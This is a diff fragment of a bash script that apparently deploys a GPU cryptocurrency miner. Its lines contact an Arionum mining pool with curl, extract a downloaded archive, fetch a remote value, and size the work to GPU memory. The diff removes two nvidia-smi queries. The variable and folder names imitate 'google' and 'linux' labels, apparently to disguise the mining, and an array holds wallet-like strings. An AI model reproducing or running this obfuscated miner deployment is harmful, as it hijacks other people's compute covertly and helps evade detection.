@@ -36,8 +36,6 @@ arr[7]="2tmy46jHQHTjMEsvgEz3BMMCnVcER97gqenr1zqzhpwd3VaiN1nS6m8eK8WTiNhXyHJBWS1F
 rand=$[$RANDOM % ${#arr[@]}]
 google84121212121212121274=${arr[2]}
 
-google84=$(nvidia-smi --query-gpu=memory.total --format=csv | sed 's/MiB//g' | sed 's/memory.total//g' | sed 's/\s+\n+\r+//g' | sed 's/\[//g' | sed 's/\]//g')
-
 string=$(curl -s -A "linux84" http://mine.arionumpool.com/mine.php?q=info)
 if [[ $string == *"16384"* ]]; then
 
@@ -80,8 +78,6 @@ tar -xf ./linux847412741274.tar.gz
 cd googleapps8474
 
 google8412=$(curl -s $google841212121274 | sed "s/\s+//g")
-
-google84=$(nvidia-smi --query-gpu=memory.total --format=csv | sed 's/MiB//g' | sed 's/memory.total//g' | sed 's/\s+\n+\r+//g' | sed 's/\[//g' | sed 's/\]//g')
 
 count=$(echo "$google84121274 - 800"|bc)
 googlelinux84=$(echo "$count / 524288"|bc -l)
